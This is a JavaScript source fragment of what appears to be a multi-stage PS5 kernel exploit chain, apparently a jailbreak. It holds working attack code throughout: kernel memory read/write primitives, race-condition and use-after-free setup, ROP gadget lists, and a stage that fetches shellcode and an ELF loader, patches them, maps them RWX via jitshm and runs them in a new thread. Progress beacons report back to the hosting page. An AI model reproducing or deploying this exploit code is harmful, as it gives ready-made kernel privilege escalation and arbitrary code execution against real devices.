        if (!S.allproc) {
          why = "-allproc-unresolved";
        } else {
          const kbase = S.allproc.sub32(PK.KERNEL_ALLPROC);
          const sf = kbase.add32(PK.KERNEL_SECURITY_FLAGS);
          const r = await kreadRetry64(sf.add32(8));
          if (!r || r.ret !== 8) why = "-read-failed";
          else tid = (r.v.low >>> 8) & 0xff;   // TARGET_ID = SECURITY_FLAGS + 9
        }
      }
    } catch (e) {
      why = "-read-threw";
    }

    const isKit = tid === 0x81;
    const kitIsh = tid === 0x81 || tid === 0x82 || tid === 0x83;
    const apply = kitIsh && (forced || (!disabled && isKit));
    if (!apply) {
      flushMark("KEXP-TARGETID",
        "live=" + (tid < 0 ? "unread" : "0x" + tid.toString(16)) + why +
        "-STOCK-kexp-forces-0x82" + (disabled ? "-keepkitid=0" : "") +
        (forced && !kitIsh ? "-forced-IGNORED-not-a-kit-id" : ""));
      return false;
    }

    // Refuse to touch anything that is not the exact stock instruction pair.
    const stockStore = [0xc6, 0x45, 0xd6, 0x82];     // mov byte [rbp-0x2a], 0x82
    const stockLog = [0xba, 0x82, 0x00, 0x00, 0x00]; // mov edx, 0x82
    for (let k = 0; k < stockStore.length; ++k)
      if (bin[0x3807 + k] !== stockStore[k]) {
        flushMark("KEXP-TARGETID", "0x3807-not-the-stock-store-REFUSING-to-patch");
        return false;
      }
    for (let k = 0; k < stockLog.length; ++k)
      if (bin[0x382a + k] !== stockLog[k]) {
        flushMark("KEXP-TARGETID", "0x382a-not-the-stock-log-REFUSING-to-patch");
        return false;
      }
    for (let k = 0; k < 4; ++k) bin[0x3807 + k] = 0x90;   // drop the overwrite
    bin[0x382a] = 0x0f; bin[0x382b] = 0xb6;               // movzx edx, byte [rbp-0x2a]
    bin[0x382c] = 0x55; bin[0x382d] = 0xd6; bin[0x382e] = 0x90;
    flushMark("KEXP-TARGETID", "live=0x" + tid.toString(16) +
      "-KIT-keeping-it-0x3807-NOPed" + (forced ? "-forced" : ""));
    return true;
  }

  // SYNCHRONOUS crash-surviving beacon. flushMark() paints an async Image, which never
// leaves the process if it dies immediately afterwards - which is exactly what happens
// on 8.20: scePthreadCreate returns 0, the kexp thread runs, and the console dies before
// STAGE5-JOIN-PRE reaches the network. A synchronous XHR blocks until the request is on
// the wire, so the last mark before the fault is preserved. Only used around the stage-5
// spawn/join window; everything else keeps the async path.
function syncMark(tag, extra) {
  try {
    if (window.__beaconOff) return;
    const x = new XMLHttpRequest();
    // "log/" so the host's 204 route matches - see flushMark. This one is synchronous
    // and blocks the thread until the request is on the wire, so a 404 that drags the
    // whole landing page back is paid for in the stage-5 window this exists to survive.
    x.open("GET", "log/SYNC-" + encodeURIComponent(
      String(tag) + (extra == null ? "" : "-" + String(extra))).slice(0, 300), false);
    x.send(null);
    // status 0 is a transient network error; a real HTTP failure means the route is
    // not there and every later mark would fail the same way, so latch off instead.
    if (x.status !== 0 && (x.status < 200 || x.status >= 300)) window.__beaconOff = true;
  } catch (e) { }
}

async function stage5Body(opts) {
    const o = opts || {};
    const out = { ok: false, why: "", steps: [], ran: false };

    flushMark(
      "STAGE5-ENTER", "dryRun=" + !!o.dryRun + "-jailbroken=" + S.jailbroken,
    );
    if (!S.jailbroken) {
      out.why = "stage 4 jailbreak not proved by getuid()";
      return out;
    }

    out.dlsym = { skipped: true, reason: "profile offsets + direct syscalls" };
    flushMark(
      "STAGE5-NO-DLSYM", "pthreadCreateOff=0x" +
        (PK.LK_PTHREAD_CREATE_NAME_NP >>> 0).toString(16) +
        "-pthreadJoinOff=0x" + (PK.LK_PTHREAD_JOIN >>> 0).toString(16),
    );
    if (PK.LK_PTHREAD_CREATE_NAME_NP < 0 || PK.LK_PTHREAD_JOIN < 0) {
      out.why = "selected firmware profile has no pthread create/join offsets";
      return out;
    }

    let binBytes = null;
    let elfBase = null, elfLen = 0, elfMapped = 0;

    flushMark(
      "STAGE5-FETCH-BIN-PRE",
      "url=../payloads/" + (o.binName || "kexp_2026_05_25.bin"),
    );
    try {
      const parts = [];
      const g = await fetchInto(
        "../payloads/" + (o.binName || "kexp_2026_05_25.bin"),
        (off, chunk) => { parts.push(chunk); },
      );
      binBytes = new Uint8Array(g.total);
      let at = 0;
      for (const c of parts) {
        binBytes.set(c, at); at += c.length;
      }
      out.steps.push(
        "shellcode " + g.total + " bytes" +
          (g.streamed ? " (streamed)" : " (buffered)"),
      );
    } catch (err) {
      out.why = "could not fetch the shellcode: " +
        String((err && err.message) || err);
      return out;
    }
    if (!binBytes.length) {
      out.why = "the shellcode is empty";
      return out;
    }
    flushMark("STAGE5-FETCH-BIN-OK", "bytes=" + binBytes.length);

    await kexpMaybeKeepKitId(binBytes);

    try {
      const name = o.elfName || "elfldr-ps5-1360.elf";
      flushMark("STAGE5-ELF-FETCH-PRE", "url=../payloads/" + name);
      const response = await fetch("../payloads/" + name, {
        cache: "no-store",
      });
      if (!response.ok)
        throw new Error("elfldr fetch failed: HTTP " + response.status);
      const elfBytes = new Uint8Array(await response.arrayBuffer());
      const declared = elfBytes.length;
      if (!(declared >= 4 && declared <= 0x1000000))
        throw new Error("invalid elfldr size " + declared);
      if (
        elfBytes[0] !== 0x7f || elfBytes[1] !== 0x45 ||
        elfBytes[2] !== 0x4c || elfBytes[3] !== 0x46
      )
        throw new Error("does not start with \x7fELF");
      flushMark("STAGE5-ELF-FETCH-OK", "bytes=" + declared);
      const mapped = (declared + PK.PAGE - 1) & ~(PK.PAGE - 1);
      const er = await sys(
        PSYS.MMAP, i64(0, 0), mapped, PK.PROT_RW,
        PK.MAP_ANON_PRIVATE, -1, i64(0, 0),
      );
      if (er.failed || isZero64(er.raw))
        throw new Error(
          "anonymous mmap of 0x" + mapped.toString(16) +
            " failed: " + er.errText,
        );
      elfBase = er.raw;
      elfMapped = mapped;
      flushMark(
        "STAGE5-ELF-MMAP",
        "addr=" + hx(elfBase) + "-size=0x" + mapped.toString(16),
      );
      let i = 0;
      const n4 = elfBytes.length & ~3;
      for (; i < n4; i += 4)
        P.write4(
          elfBase.add32(i), elfBytes[i] | (elfBytes[i + 1] << 8) |
            (elfBytes[i + 2] << 16) | (elfBytes[i + 3] << 24),
        );
      for (; i < elfBytes.length; ++i)
        P.write1(elfBase.add32(i), elfBytes[i]);
      elfLen = elfBytes.length;
      const back = P.read4(elfBase);
      out.steps.push(
        "elfldr @ " + hx(elfBase) + " size 0x" + elfLen.toString(16) +
          " in anon mmap 0x" + mapped.toString(16) +
          "; first dword reads back 0x" + (back >>> 0).toString(16),
      );
    } catch (err) {
      out.why = "could not stage the elfldr: " +
        String((err && err.message) || err);
      return out;
    }

    flushMark(
      "STAGE5-STAGED", "bin=" + (binBytes ? binBytes.length : -1) +
        "-elf=" + elfLen + "-elfAt=" + hx(elfBase) + "-mapped=0x" +
        elfMapped.toString(16),
    );

    const ap = await getAllproc();
    if (!ap.ok) {
      out.why = "allproc " + ap.why; return out;
    }
    const allproc = ap.addr;
    out.steps.push("allproc = " + hx(allproc) +
      (ap.cached ? " (proven in stage 4)" : " (proven here)"),);
    flushMark("STAGE5-ALLPROC",
      "allproc=" + hx(allproc) + "-cached=" + !!ap.cached,);

    const resolverCallA = [0xe8, 0xcf, 0x00, 0x00, 0x00];
    const resolverCallB = [0xe8, 0x78, 0x01, 0x00, 0x00];
    const getpidBlock = [
      0x48, 0x8d, 0x35, 0xac, 0x30, 0x00, 0x00,
      0x48, 0x8d, 0x55, 0xd0, 0xbf, 0x01, 0x20, 0x00, 0x00,
      0xe8, 0x41, 0x2b, 0x00, 0x00,
    ];
    const bytesAt = (off, expected) =>
      expected.every((value, index) => binBytes[off + index] === value);
    const requiredResolverOffsets = [
      PK.LK_NOTIFY, PK.LK_SYSCTLBYNAME, PK.LK_PTHREAD_CREATE,
      PK.LK_PTHREAD_JOIN, PK.LC_MALLOC, PK.LC_FREE, PK.LC_MEMCPY,
      PK.LC_MEMSET, PK.LC_STRCMP, PK.LC_MEMCMP, PK.LC_VSNPRINTF,
      PK.LK_GETPID,
    ];
    if (
      binBytes.length !== 18912 || !bytesAt(0x1c, resolverCallA) ||
      !bytesAt(0x23, resolverCallB) || !bytesAt(0x10f1, getpidBlock) ||
      requiredResolverOffsets.some((off) => off < 0)
    ) {
      out.why = "payload resolver bypass signature/profile check failed"; return out;
    }

    for (let i = 0; i < 5; ++i) {
      binBytes[0x1c + i] = 0x90; binBytes[0x23 + i] = 0x90;
    }
    const resolvedSlots = [
      [0x48b0, P.libKernelBase.add32(PK.LK_NOTIFY)], [0x48b8, P.libKernelBase.add32(PK.LK_SYSCTLBYNAME)],
      [0x48c0, P.libKernelBase.add32(PK.LK_PTHREAD_CREATE)], [0x48c8, P.libKernelBase.add32(PK.LK_PTHREAD_JOIN)],
      [0x48d0, P.libSceLibcInternalBase.add32(PK.LC_MALLOC)], [0x48d8, P.libSceLibcInternalBase.add32(PK.LC_FREE)],
      [0x48e0, P.libSceLibcInternalBase.add32(PK.LC_MEMCPY)], [0x48e8, P.libSceLibcInternalBase.add32(PK.LC_MEMSET)],
      [0x48f0, P.libSceLibcInternalBase.add32(PK.LC_STRCMP)], [0x48f8, P.libSceLibcInternalBase.add32(PK.LC_MEMCMP)],
      [0x4900, P.libSceLibcInternalBase.add32(PK.LC_VSNPRINTF)],
    ];
    for (const [slot, address] of resolvedSlots) w64(binBytes, slot, address);

    const getpidAddress = P.libKernelBase.add32(PK.LK_GETPID);
    binBytes[0x10f1] = 0x48; binBytes[0x10f2] = 0xb8;
    w64(binBytes, 0x10f3, getpidAddress);
    const getpidTail = [0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0];
    for (let i = 0; i < getpidTail.length; ++i)
      binBytes[0x10fb + i] = getpidTail[i];
    for (let i = 0x1101; i < 0x1106; ++i) binBytes[i] = 0x90;
    flushMark("STAGE5-RESOLVER-BYPASS",
      "payload=618f4b12-slots=11-getpid=" + hx(getpidAddress) +
        "-dlsym-syscall-calls-skipped=12",);

    const size = binBytes.length;
    const aligned = (size + PK.PAGE - 1) & ~(PK.PAGE - 1);
    const jr = await sys(PSYS.JITSHM_CREATE, 0, aligned, 0x7);
    if (jr.failed || jr.s32 < 0) {
      out.why = "jitshm_create failed: " + jr.errText; return out;
    }
    const execFd = jr.s32;
    track(execFd);
    const mr = await sys(
      PSYS.MMAP, i64(0, 0), aligned, PK.PROT_RWX,
      PK.MAP_SHARED, execFd, i64(0, 0),
    );
    if (mr.failed || isZero64(mr.raw)) {
      out.why = "mmap(PROT_RWX, MAP_SHARED, jitshm fd) failed: " + mr.errText;
      return out;
    }
    const entry = mr.raw;
    out.steps.push("shellcode mapped RWX @ " + hx(entry) + " size 0x" +
      aligned.toString(16) + " via jitshm fd " + execFd,);
    flushMark("STAGE5-MAP", "entry=" + hx(entry) + "-size=0x" +
      aligned.toString(16) + "-jitfd=" + execFd,);

    const expectDword = (off) =>
      (binBytes[off] | (binBytes[off + 1] << 8) |
        (binBytes[off + 2] << 16) | (binBytes[off + 3] << 24)) >>> 0;
    function writeAndVerify(dst) {
      for (let i = 0; i < size; ++i) P.write1(dst.add32(i), binBytes[i]);
      let bad = 0, firstBad = -1;
      for (let off = 0; off + 4 <= size; off += 4) {
        if (P.read4(dst.add32(off)) >>> 0 !== expectDword(off)) {
          if (firstBad < 0) firstBad = off;
          ++bad;
        }
      }
      return { bad, firstBad, first: P.read4(dst) >>> 0 };
    }

    let v = writeAndVerify(entry);
    flushMark("STAGE5-SHELLCODE-VERIFY", "at=" + hx(entry) +
      "-first=0x" + v.first.toString(16) + "-expect=0x" +
      expectDword(0).toString(16) + "-badDwords=" + v.bad + "-of-" +
      (size >> 2) + "-firstBad=" + v.firstBad,);

    if (v.bad !== 0) {
      const ar = await sys(PSYS.JITSHM_ALIAS, execFd, PK.PROT_RW);
      if (ar.failed || ar.s32 < 0) {
        out.why = "RWX write did not land (" + v.bad + " of " + (size >> 2) +
          " dwords wrong, first at " + v.firstBad +
          ") and jitshm_alias failed: " + ar.errText;
        return out;
      }
      const wFd = ar.s32;
      track(wFd);
      const wm = await sys(
        PSYS.MMAP, i64(0, 0), aligned, PK.PROT_RW,
        PK.MAP_SHARED, wFd, i64(0, 0),
      );
      if (wm.failed || isZero64(wm.raw)) {
        out.why = "jitshm_alias fd " + wFd +
          " gave no writable mapping: " + wm.errText;
        return out;
      }
      const wAddr = wm.raw;
      flushMark("STAGE5-ALIAS", "wfd=" + wFd + "-writeAt=" + hx(wAddr) +
        "-execAt=" + hx(entry) + "-direct-RWX-write-did-not-land",);
      v = writeAndVerify(wAddr);

      const execFirst = P.read4(entry) >>> 0;
      flushMark("STAGE5-ALIAS-VERIFY", "aliasBad=" + v.bad +
        "-execFirst=0x" + execFirst.toString(16) + "-expect=0x" +
        expectDword(0).toString(16),);
      if (v.bad !== 0 || execFirst !== expectDword(0)) {
        out.why = "alias write did not land (" + v.bad +
          " bad dwords; exec mapping reads 0x" + execFirst.toString(16) +
          ", wrote 0x" + expectDword(0).toString(16) + "); not spawning";
        return out;
      }
      await sys(PSYS.MUNMAP, wAddr, aligned);
    }
    out.steps.push("shellcode written and verified at " + hx(entry) +
      "; first dword 0x" + expectDword(0).toString(16),);

    const lkb = P.libKernelBase;
    if (!lkb || isZero64(lkb)) {
      out.why = "libKernelBase is " + hx(lkb) + "; cannot locate pthread";
      return out;
    }
    const useSizedSceThread =
      PK.LK_SCE_PTHREAD_CREATE >= 0 && PK.LK_SCE_PTHREAD_JOIN >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_INIT >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_SETSTACKSIZE >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_SETDETACHSTATE >= 0 &&
      PK.LK_SCE_PTHREAD_ATTR_DESTROY >= 0;
    const tc = {
      addr: lkb.add32(useSizedSceThread ? PK.LK_SCE_PTHREAD_CREATE :
        PK.LK_PTHREAD_CREATE_NAME_NP,),
    };
    const tj = {
      addr: lkb.add32(
        useSizedSceThread ? PK.LK_SCE_PTHREAD_JOIN : PK.LK_PTHREAD_JOIN,),
    };
    out.steps.push("libkernel=" + hx(lkb) +
      (useSizedSceThread ? " scePthreadCreate=" : " pthread_create_name_np=") +
      hx(tc.addr) + " pthread_join=" + hx(tj.addr),);
    flushMark("STAGE5-PTHREAD", "libkernel=" + hx(lkb) +
      "-create=" + hx(tc.addr) + "-join=" + hx(tj.addr),);

    const args = alloc(0x28, "stage5-shellcode-args");
    w32(args.u8, 0x00, S.masterRfd); w32(args.u8, 0x04, S.masterWfd);
    w32(args.u8, 0x08, S.victimRfd); w32(args.u8, 0x0c, S.victimWfd);
    w64(args.u8, 0x10, allproc); w64(args.u8, 0x18, elfBase);
    w64(args.u8, 0x20, i64(elfLen, 0));
    flushMark("STAGE5-ARGS", "master=" + S.masterRfd + "." + S.masterWfd +
      "-victim=" + S.victimRfd + "." + S.victimWfd +
      "-allproc=" + hx(allproc) + "-elfldr=" + hx(elfBase) + "-size=0x" +
      elfLen.toString(16),);

    if (o.dryRun) {
      out.ok = true; out.ran = false;

      let freed = false;
      if (elfBase && elfMapped) {
        const ur = await sys(PSYS.MUNMAP, elfBase, elfMapped);
        freed = !ur.failed;
        queueEvent("STAGE5-MUNMAP", "addr=" + hx(elfBase) + "-size=0x" +
          elfMapped.toString(16) + "-ok=" + freed +
          "-why=dry-run-elfldr-never-handed-over",);
      }
      elfBase = null;
      out.steps.push("dry run: prepared, thread not spawned" +
        (freed ? ", elfldr mapping unmapped" : ""),);
      return out;
    }

    const handleBuf = alloc(8, "stage5-thr-handle");
    const retBuf = alloc(8, "stage5-thr-ret");

    const pbPrep = alloc(PK.PIPEBUF_SIZE, "stage5-pipebuf-prep");
    const pbOut = pbPrep.u8;
    w32(pbOut, 0x00, 0); w32(pbOut, 0x04, 0); w32(pbOut, 0x08, 0);
    w32(pbOut, 0x0c, PK.PIPE_PAGE_SIZE);
    w64(pbOut, 0x10, S.victimPipeData);
    await kwriteFast(S.masterPipeData, pbPrep, PK.PIPEBUF_SIZE);
    const pbBack = await kreadRetry64(S.masterPipeData.add32(0x10));
    const pbHdr = await kreadRetry64(S.masterPipeData);
    const pbOk = pbBack.ret === 8 &&
      pbBack.v.low === S.victimPipeData.low &&
      pbBack.v.hi === S.victimPipeData.hi;
    flushMark("STAGE5-PIPEBUF", "master=" + hx(S.masterPipeData) +
      "-buffer=" + hx(pbBack.v) + "-wantVictim=" + hx(S.victimPipeData) +
      "-cntIn=" + hx(pbHdr.v) + "-ok=" + pbOk,);
    if (!pbOk) {
      out.why = "master pipebuf does not point at the victim pipe " +
        "(buffer=" + hx(pbBack.v) + ", wanted " + hx(S.victimPipeData) + ")";
      return out;
    }

    const method = o.spawn ||
      (typeof window !== "undefined" && window.POOPS_SPAWN) || PK.STAGE5_SPAWN;
    out.spawn = method;
    flushMark("STAGE5-SPAWN",
      "entry=" + hx(entry) + "-args=" + hx(args.base) + "-via=" + method,);

    async function releaseElf() {
      if (!elfBase || !elfMapped) return false;
      const ur = await sys(PSYS.MUNMAP, elfBase, elfMapped);
      elfBase = null;
      return !ur.failed;
    }

    if (method === "thr_new") {
      const scStack = alloc(PK.STAGE5_THR_STACK, "stage5-thr-stack");
      const scTls = alloc(PK.STAGE5_THR_TLS, "stage5-thr-tls");
      const tidBuf = alloc(8, "stage5-thr-tid");
      const ptidBuf = alloc(8, "stage5-thr-ptid");

      w64(scTls.u8, 0, scTls.base);

      const exitStub = P.syscalls[PSYS.THR_EXIT];
      if (exitStub === undefined) {
        out.why = "no thr_exit stub in the syscall map"; return out;
      }
      for (let q = 1; q <= 16; ++q)
        w64(scStack.u8, PK.STAGE5_THR_STACK - q * 8, exitStub);

      const param = alloc(0x68, "stage5-thr-param");
      w64(param.u8, 0x00, entry); w64(param.u8, 0x08, args.base);
      w64(param.u8, 0x10, scStack.base);
      w64(param.u8, 0x18, i64(PK.STAGE5_THR_STACK, 0));
      w64(param.u8, 0x20, scTls.base);
      w64(param.u8, 0x28, i64(PK.STAGE5_THR_TLS, 0));
      w64(param.u8, 0x30, tidBuf.base); w64(param.u8, 0x38, ptidBuf.base);

      flushMark("STAGE5-THRNEW-PRE", "param=" + hx(param.base) +
        "-entry=" + hx(entry) + "-arg=" + hx(args.base) +
        "-stack=" + hx(scStack.base) + "-size=0x" +
        PK.STAGE5_THR_STACK.toString(16) + "-tls=" + hx(scTls.base) +
        "-retTo=" + hx(exitStub),);

      const tr = await sys(PSYS.THR_NEW, param.base, 0x68);
      const tid = r64(tidBuf.u8, 0);

      flushMark("STAGE5-CREATE-RET", "ret=" + tr.s32 +
        "-failed=" + tr.failed + "-tid=" + hx(tid) + "-thr_new-RETURNED",);
      if (tr.failed || tr.s32 !== 0) {
        out.why = "thr_new failed: " + tr.errText +
          "; thread not created, shellcode did not run";
        return out;
      }
      out.ran = true;
      out.steps.push("thr_new spawned tid " + hx(tid));

      let exited = false, ticks = 0;
      for (; ticks < PK.STAGE5_WAIT_TICKS; ++ticks) {
        await new Promise((r) => setTimeout(r, PK.STAGE5_WAIT_MS));
        if (isZero64(r64(tidBuf.u8, 0))) {
          exited = true; break;
        }
      }
      const waited = (ticks + 1) * PK.STAGE5_WAIT_MS;

      const freed = exited ? await releaseElf() : false;
      out.ok = true; out.shellRet = "n/a (thr_new has no join)";
      flushMark("STAGE5-DONE", "spawn=thr_new-tid=" + hx(tid) +
        "-exited=" + exited + "-waitedMs=" + waited +
        "-elfldrUnmapped=" + freed,);
      out.steps.push(exited ? "shellcode thread exited after " + waited +
        " ms" + (freed ? ", elfldr mapping released" : "") :
        "shellcode thread still alive after " + waited +
          " ms; elfldr mapping left in place",);
      return out;
    }

    const nameBuf = alloc(16, "stage5-thread-name");
    for (let i = 0; i < 5; ++i) nameBuf.u8[i] = "poops".charCodeAt(i);

    let attrBuf = null;
    if (useSizedSceThread) {
      attrBuf = alloc(0x100, "stage5-pthread-attr");
      const attrCalls = [
        ["init", PK.LK_SCE_PTHREAD_ATTR_INIT, [attrBuf.base]],
        ["stacksize", PK.LK_SCE_PTHREAD_ATTR_SETSTACKSIZE,
          [attrBuf.base, i64(0x80000, 0)],],
        ["detachstate", PK.LK_SCE_PTHREAD_ATTR_SETDETACHSTATE,
          [attrBuf.base, i64(0, 0)],],
      ];
      for (const [label, off, argv] of attrCalls) {
        await runBuilt("stage5-pthread-attr-" + label, () => {
          armRet(1); emitCallAddr(lkb.add32(off), retPtr(0), ...argv);
        });
        const ar = retOf(0);
        flushMark("STAGE5-ATTR", label + "-ret=" + ar);
        if (ar !== 0) {
          out.why = "scePthreadAttr " + label + " returned " + ar; return out;
        }
      }
    }

    await runBuilt("stage5-thrd-create", () => {
      armRet(1);
      emitCallAddr(tc.addr, retPtr(0), handleBuf.base,
        attrBuf ? attrBuf.base : i64(0, 0), entry, args.base, nameBuf.base,);
    });
    const tcRet = retOf(0);
    const handle = r64(handleBuf.u8, 0);

    if (attrBuf) {
      await runBuilt("stage5-pthread-attr-destroy", () => {
        armRet(1);
        emitCallAddr(lkb.add32(PK.LK_SCE_PTHREAD_ATTR_DESTROY),
          retPtr(0), attrBuf.base,);
      });
      flushMark("STAGE5-ATTR", "destroy-ret=" + retOf(0));
    }

    flushMark("STAGE5-CREATE-RET", "ret=" + tcRet + "-handle=" + hx(handle));
    syncMark("STAGE5-CREATE-RET", "ret=" + tcRet + "-handle=" + hx(handle));
    if (tcRet !== 0) {
      out.why =
        (useSizedSceThread ? "scePthreadCreate" : "pthread_create_name_np") +
        " returned " + tcRet + ", expected 0; shellcode did not run";
      return out;
    }
    out.steps.push("thread spawned, handle " + hx(handle));
    flushMark("STAGE5-JOIN-PRE",
      "handle=" + hx(handle) + "-about-to-join-the-shellcode-thread",);
    syncMark("STAGE5-JOIN-PRE", "handle=" + hx(handle) + "-thread-is-about-to-run");

    await runBuilt("stage5-thrd-join", () => {
      armRet(1); emitCallAddr(tj.addr, retPtr(0), handle, retBuf.base, 0);
    });
    const tjRet = retOf(0);
    const shellRet = r64(retBuf.u8, 0);
    const retStorageReleased = unpin(retBuf, "pthread_join return value consumed",);
    unpin(handleBuf, "pthread handle consumed");
    out.ran = true; out.ok = tjRet === 0; out.shellRet = hx(shellRet);
    out.steps.push("Thrd_join returned " + tjRet +
      ", shellcode returned " + hx(shellRet),);

    let freedElf = false;
    if (elfBase && elfMapped) {
      const ur = await sys(PSYS.MUNMAP, elfBase, elfMapped);
      freedElf = !ur.failed;
    }
    elfBase = null;
    flushMark("STAGE5-DONE", "joinRet=" + tjRet +
      "-shellcodeRet=" + hx(shellRet) +
      "-retStorageReleased=" + retStorageReleased +
      "-elfldrUnmapped=" + freedElf,);
    if (!out.ok) out.why = "Thrd_join returned " + tjRet;
    return out;
  }

  return {
    PK,
    PSYS,
    TW,
    H,
    S,

    buildBuffers,
    socketpairUnix,
    pipe2Nonblock,
    setupRacerGroups,
    spawnRacers,
    makeRacerGroup,

    flushIovWorkers,
    forceSettled,
    releaseIovAndSettle,
    attemptRace,
    stage0,
    kreadSlow,
    kslow64,
    kslowRead,
    buildUio,
    stage1,
    stage2,
    stage3,
    stage4,
    stage5,
    kwriteSlow,
    findAllproc,
    emitCallAddr,
    findRootvnode,
    findProcByPid,
    kreadFast,
    kwriteFast,
    kread64Fast,
    kread32Fast,
    kwrite64Fast,
    kwrite32Fast,
    fgetFast,
    fholdFast,
    findCurproc,
    removeRthrFromSocket,
    removeUafFile,
    prepareFds,
    openFreeFdSource,
    pickBurnCores,

    buildBurnWorker,
    RACER_FIELDS,
    crfree,
    triggerNetcontrol,
    armLineA,
    yieldN,
    sleepK,
    alloc,
    runBuilt,
    emit,
    retPtr,
    retOf,
    armRet,
    needStub,
    bankFd,
    emitFreeRthdr,
    emitGetRthdr,
    cleanup: cleanupOnce,
    unblockGroup,
    verdict,
    STEPS,
    terminateBurn,
    releaseUioAndSettle,
    drainUioBuffer,

    get triggered() {
      return S.triggered;
    },
    get corrupt() {
      return TW.corrupt;
    },
    get triplets() {
      return TW.S.triplets;
    },
    get kernelWrites() {
      return S.kernelWrites;
    },
    setFamily(f) {
      S.triggerFamily = f;
      return f;
    },
    setPipes(m, mw, v, vw) {
      S.masterRfd = m;
      S.masterWfd = mw;
      S.victimRfd = v;
      S.victimWfd = vw;
    },
    setSocketpairs(ia, ib, ua, ub) {
      S.iovSockA = ia;
      S.iovSockB = ib;
      S.uioSockA = ua;
      S.uioSockB = ub;
    },
  };
}

export function buildLadder(X, E) {
  const {
    sys,
    mem,
    flushMark,
    queueEvent,
    note,
    PASS,
    FAIL,
    NA,
    track,
    untrack,
    cfg,
    latch,
    chain,
    runChain,
    P,
    driver,
    state,
    sleep,
    i64,
  } = X;

  function needTrigger(what) {
    if (E.triggered) return null;
    return NA("no trigger armed, no triplet to " + what);
  }

  const TW = E.TW;
  const H = E.H;
  const L = [];

  function need(what, cond) {
    return cond
      ? null
      : FAIL(
          "needs " +
            what +
            ", which did not run " +
            "(skipped by ?only= or ?from=)",
        );
  }

  L.push({
    key: "ps0_preflight",
    label: "preflight: stubs, gadgets, core, measured cost",
    cls: "measurement",
    hot: true,
    async run() {
      const wanted = [
        [PSYS.GETPID, "round-trip calibration"],
        [PSYS.READ, "iov/uio drain"],
        [PSYS.WRITE, "iov/uio feed"],
        [PSYS.CLOSE, "every free"],
        [PSYS.RECVMSG, "four iov racers block in it"],
        [PSYS.SOCKET, "IPv6 spray bank"],
        [PSYS.SETSOCKOPT, "set_rthdr / free_rthdr"],
        [PSYS.GETSOCKOPT, "get_rthdr, the only read handle"],
        [PSYS.READV, "uio write racers"],
        [PSYS.WRITEV, "uio read racers"],
        [PSYS.SOCKETPAIR, "iov_ss and uio_ss"],
        [PSYS.KQUEUE, "stage 1 reclaim"],
        [PSYS.NANOSLEEP, "every settle"],
        [PSYS.SCHED_YIELD, "the race is yield-ordered"],

        [PSYS.THR_NEW, "twelve racers"],
        [PSYS.THR_EXIT, "kill switch tail"],
        [PSYS.READ, "racers park in read() on their wake gate"],
        [
          PSYS.PIPE2,
          "master/victim pipes and twelve racer wake " +
            "gates; 0x2A is banned",
        ],
        [PSYS.RTPRIO_THREAD, "PRI_REALTIME/256"],
        [PSYS.CPUSET_GETAFFINITY, "inherited mask"],
        [PSYS.CPUSET_SETAFFINITY, "the pin"],
      ];
      const missing = [];
      for (const [num, why] of wanted)
        if (P.syscalls[num] === undefined)
          missing.push(
            "0x" + num.toString(16).toUpperCase() + " (" + why + ")",
          );

      if (cfg.trigger === "netcontrol") {
        for (const [num, why] of [
          [PSYS.NETCONTROL, "SET/CLEAR_QUEUE"],
          [PSYS.SETUID, "fresh cred"],
          [PSYS.DUP, "close(dup(uaf))"],
        ])
          if (P.syscalls[num] === undefined)
            missing.push(
              "0x" + num.toString(16).toUpperCase() + " (" + why + ")",
            );
      }
      if (cfg.trigger === "overflow") {
        for (const [num, why] of [
          [PSYS.KQUEUEEX, "cr_ref burn"],
          [PSYS.OPEN, "free-fd pool"],
          [PSYS.SETUID, "fresh cred"],
          [PSYS.GETRLIMIT, "raise NOFILE"],
          [PSYS.SETRLIMIT, "raise NOFILE"],
        ])
          if (P.syscalls[num] === undefined)
            missing.push(
              "0x" + num.toString(16).toUpperCase() + " (" + why + ")",
            );
      }
      if (missing.length)
        return FAIL(
          "missing syscall stubs in the active firmware profile: "
            + missing.join(", "),
        );
      note("all stage 0-2 syscall stubs present in the active firmware profile ("
        + Object.keys(P.syscalls).length + " entries)");

      const gadgets = [
        "pop rdi",
        "pop rsi",
        "pop rdx",
        "pop rcx",
        "pop r8",
        "pop r9",
        "pop rax",
        "pop rsp",
        "ret",
        "mov [rdi], rax",
        "mov [rdi], eax",
        "mov [rdi], rsi",
        "mov rax, [rax]",
        "inc dword [rax]",
      ];

      if (cfg.trigger === "overflow")
        gadgets.push("cmp [rcx], eax", "sete al", "shl rax, 3", "add rax, rcx");
      const badG = gadgets.filter((g) => P.gadgets[g] === undefined);
      if (badG.length) return FAIL("missing gadgets: " + badG.join(", "));

      const word = driver.origMaskBytes ? r32(driver.origMaskBytes, 0) : 0;
      if (!word) return FAIL("inherited affinity mask is 0, no core to pin to");
      if (((word >>> driver.core) & 1) === 0)
        return FAIL(
          "chosen core " +
            driver.core +
            " is not in the " +
            "inherited mask 0x" +
            word.toString(16),
        );
      note(
        "inherited mask 0x" +
          word.toString(16) +
          " = cores " +
          coreList(word) +
          "; driver core " +
          driver.core +
          " -- " +
          driver.coreWhy,
      );
      note("poops.c:52 hardcodes MAIN_CORE 5 and p2jb.js:193 uses 4");

      const REPS = 12;
      for (let w = 0; w < 4; ++w) {
        chain.fcall(P.syscalls[PSYS.GETPID]);
        chain.write_result4(chain.return_value);
        await runChain();
      }
      let empty = 0;
      for (let r = 0; r < REPS; ++r) {
        const t0 = Date.now();
        await runChain();
        empty += Date.now() - t0;
      }
      const a = empty / REPS;
      let loaded = 0;
      for (let r = 0; r < REPS; ++r) {
        for (let i = 0; i < 32; ++i) {
          chain.fcall(P.syscalls[PSYS.GETPID]);
          chain.write_result4(chain.return_value);
        }
        const t0 = Date.now();
        await runChain();
        loaded += Date.now() - t0;
      }
      const b = (loaded / REPS - a) / 32;
      X.measured.rt = { a, b };
      note(
        "measured: chain.run() = " +
          a.toFixed(2) +
          " ms fixed + " +
          (b * 1000).toFixed(1) +
          " us per in-chain syscall",
      );

      const n = cfg.sockets;

      const perRoundSys = PK.IOV_THREAD_NUM + 3;
      const perAttemptSys =
        n +
        1 +
        PK.IOV_FLUSH_ROUNDS * perRoundSys +
        1 +
        PK.MAX_ROUNDS_TWIN * 2 * n;

      const perAttemptRt = 1 + PK.IOV_FLUSH_ROUNDS * 2 + 1 + PK.MAX_ROUNDS_TWIN;
      const perAttemptMs =
